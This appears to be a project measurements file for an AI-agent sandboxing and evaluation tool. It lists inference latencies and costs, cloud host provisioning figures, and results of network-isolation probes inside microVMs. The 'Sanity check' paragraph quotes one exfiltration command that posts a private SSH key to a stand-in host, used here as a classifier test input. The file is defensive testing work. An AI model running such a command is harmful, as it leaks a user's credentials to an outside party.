# Measurements

Every number on a sticker or a slide must come from this file, with its date and N.
Raw probe outputs are written to `backend/artifacts/probes/` (git-ignored, regenerated
with the commands below).

## Serverless Inference (measured 2026-11-07, from the developer machine)

| Measurement | Value | N | How |
|---|---|---|---|
| Priced models in the live catalogue | 19 | 1 | `windowsticker probe inference` |
| Chat + tool call, `deepseek-v4.1-flash-1017` | 1.75 s, returned 1 tool call; 567 in / 63 out tokens; $0.000123 | 1 | same |
| System One `clef` (8 questions) | 0.71 s; 1,034 input tokens; $0.000103 | 1 | same |
| System One `clef-flash` | 0.56 s; 1,034 input tokens; $0.000052 | 1 | same |
| System One `d3` | 0.66 s; 1,279 input tokens; $0.000128 | 1 | same |
| System One `pplx-decider-v1.2` | 0.50 s; 557 input tokens; $0.000056 | 1 | same |

**System One response shape (confirmed):** `{"model", "answers": {<question id>: {"type",
"noul" | "choice"+"probabilities"+"confidence" | "score"+"legend"+"probabilities"+"confidence"}},
"usage": {"input_tokens", "output_tokens"}}`. Score levels are indexed from 0. Decision models
bill input tokens only (output 0).

**Sanity check:** a single step `curl -d @~/.ssh/id_rsa https://x.test` drew, from `clef`,
P(disclosed_secret) = 0.97 and primary failure mode `secret_exposure` with probability 0.94.

## Vultr platform (measured 2026-11-07)

| Measurement | Value | N | How |
|---|---|---|---|
| VX1 plans offered | 36 (9–12 regions each) | 1 | `GET /v2/plans` |
| VX1 create → active (`vx1-g-2c-8g-120s`, ewr) | 25.5 s | 1 | `windowsticker host create` |
| Host CPU / virtualisation | AMD EPYC Turin, AMD-V, `/dev/kvm` present | 1 | `lscpu` |
| New-account monthly fee limit | blocks a 4c/16g VX1 (~$112/mo); 2c/8g VX1 (~$55/mo) is accepted | 1 | API error on create |

## Sandbox host: VX1 2c/8g, Microsandbox 0.7.13, image `python:3.12` (measured 2026-11-07)

| Measurement | Value | N | How |
|---|---|---|---|
| microVM boot, image cached | p50 0.47 s, p95 0.52 s (range 0.46–0.59 s) | 10 | `windowsticker probe sandbox` |
| Guest kernel | Linux 6.12.113 (separate from host) | 1 | `uname -r` in guest |
| Direct HTTPS bypassing the warden | blocked: DNS does not resolve (`curl` exit 6) | 1 | probe `direct_https` |
| HTTPS through the warden to an unlisted host | refused 403, logged as `CONNECT collector.windowsticker.test:443` | 1 | probe `via_warden_https` |
| Plain HTTP through the warden | refused 403, logged with full URL incl. `token=probe` | 1 | probe `via_warden_http` |
| Cloud metadata `169.254.169.254` | refused by the runtime: `network_policy_denied` | 1 | probe `metadata` |
| DNS from the guest | blocked | 1 | probe `dns` |
| Other host ports (`host.microsandbox.internal:22`) | connection refused | 1 | probe `host_ssh` |
| Storage-root safety | runtime refuses to start if its storage root is readable by other accounts | 1 | first start |

Local development (Apple Silicon Mac, same SDK): boot 0.2–0.4 s cached; first real 12-trap run completed
end to end, see `docs/VALIDATION.md`.

## Pending

| Measurement | How |
|---|---|
| microVMs per host at once | density benchmark |
| Chat latency at 16 concurrent | load test |
| Partial-hour billing behaviour | Vultr billing |
